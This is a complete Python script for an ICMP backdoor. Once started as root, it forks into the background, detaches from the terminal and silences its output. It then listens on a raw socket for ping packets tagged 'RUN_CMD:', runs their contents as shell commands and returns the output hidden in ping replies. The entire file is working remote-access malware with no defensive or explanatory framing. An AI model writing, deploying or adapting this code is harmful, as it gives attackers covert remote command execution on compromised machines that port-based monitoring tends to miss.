#!/usr/bin/env python3
import socket
import struct
import subprocess
import sys
import os

# --- Configuration ---
SIGNATURE = b"RUN_CMD:"
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
MAX_PACKET_SIZE = 65535

def calc_icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def build_icmp_reply(icmp_id, icmp_seq, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, icmp_id, icmp_seq)
    packet = header + payload
    chksum = calc_icmp_checksum(packet)
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, chksum, icmp_id, icmp_seq)
    return header + payload

def execute_command(command_str):
    try:
        # shell=True allows using pipes, redirects, etc.
        output = subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
        return output if output else b"OK"
    except:
        return b"Error"

def run_server():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        sys.exit(1)

    while True:
        packet, (src_ip, _) = sock.recvfrom(MAX_PACKET_SIZE)
        
        # IP header is usually 20 bytes
        ip_header_len = (packet[0] & 0x0F) * 4
        icmp_header = packet[ip_header_len : ip_header_len + 8]
        icmp_type, code, cksum, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_header)

        if icmp_type == ICMP_ECHO_REQUEST:
            payload = packet[ip_header_len + 8:]
            
            if payload.startswith(SIGNATURE):
                command = payload[len(SIGNATURE):].decode(errors='ignore').strip()
                result = execute_command(command)
                
                reply = build_icmp_reply(icmp_id, icmp_seq, result)
                sock.sendto(reply, (src_ip, 0))

if __name__ == "__main__":
    if os.getuid() != 0:
        sys.exit(1)

    # Minimal backgrounding: single fork
    try:
        if os.fork() > 0:
            sys.exit(0) # Exit the parent
    except OSError:
        sys.exit(1)

    # Decouple from terminal
    os.setsid()
    
    # Close standard streams to prevent hanging the terminal
    sys.stdin.close()
    sys.stdout.close()
    sys.stderr.close()
    
    # Point descriptors to null
    null = os.open(os.devnull, os.O_RDWR)
    os.dup2(null, 0)
    os.dup2(null, 1)
    os.dup2(null, 2)

    run_server()
